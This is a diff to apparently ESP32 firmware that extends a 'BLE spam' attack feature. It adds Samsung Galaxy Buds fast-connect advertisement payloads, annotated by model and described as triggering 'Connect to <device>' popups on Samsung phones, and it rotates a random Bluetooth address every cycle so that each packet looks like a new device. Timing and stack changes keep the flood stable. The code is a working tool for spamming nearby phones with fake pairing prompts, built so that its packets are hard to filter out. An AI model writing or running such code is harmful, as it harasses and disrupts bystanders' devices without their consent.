@@ -22508,10 +22508,15 @@ static const uint8_t s_apple_payloads[][10] = {
 };
 #define APPLE_PAYLOAD_COUNT (int)(sizeof(s_apple_payloads)/sizeof(s_apple_payloads[0]))
 
-// Samsung Galaxy Watch fast-connect (company ID 0x0075)
+// Samsung Galaxy Buds fast-connect (company ID 0x0075)
+// Last byte selects device model — triggers "Connect to <device>" popup on Samsung phones
 static const uint8_t s_samsung_payloads[][10] = {
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21},
-    {0x75,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00},
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21}, // Galaxy Buds Pro  (SM-R190)
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0xA7}, // Galaxy Buds Live (SM-R180)
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x33}, // Galaxy Buds2     (SM-R177)
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x09}, // Galaxy Buds+     (SM-R175)
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x46}, // Galaxy Buds2 Pro (SM-R510)
+    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x63}, // Galaxy Buds FE   (SM-R400)
 };
 #define SAMSUNG_PAYLOAD_COUNT (int)(sizeof(s_samsung_payloads)/sizeof(s_samsung_payloads[0]))
 
@@ -22570,7 +22575,19 @@ static void ble_spam_task(void *pvParameters)
     int mode_round = 0; // cycles through modes when ALL
 
     while (ble_spam_active) {
-        ble_gap_adv_stop(); // stop any previous advertising (ignore return)
+        // Rotate random address each cycle so scanners see a new device every packet.
+        // Without this every advertisement comes from the same MAC and nRF Connect
+        // updates the same row instead of showing a new device.
+        ble_addr_t rnd_addr;
+        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0)
+            ble_hs_id_set_rnd(rnd_addr.val);
+
+        ble_gap_adv_stop();
+        // Brief yield so NimBLE host task can process the stop event and free
+        // internal advertising resources before we set new fields. Without this
+        // the mbuf pool and event queue drain slowly until ~1400 cycles in the
+        // host asserts / watchdog fires.
+        vTaskDelay(pdMS_TO_TICKS(10));
 
         struct ble_hs_adv_fields fields;
         memset(&fields, 0, sizeof(fields));
@@ -22629,7 +22646,7 @@ static void ble_spam_task(void *pvParameters)
                               &adv_params, NULL, NULL);
         }
 
-        vTaskDelay(pdMS_TO_TICKS(180));
+        vTaskDelay(pdMS_TO_TICKS(170)); // 10 + 170 = 180 ms total per cycle
         ble_spam_count++;
         ble_spam_needs_ui_update = true;
     }
@@ -22659,7 +22676,7 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
         ble_spam_active = true;
         lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "STOP");
         lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
-        xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 5, &ble_spam_task_handle);
+        xTaskCreate(ble_spam_task, "ble_spam", 8192, NULL, 5, &ble_spam_task_handle);
     }
 }
 
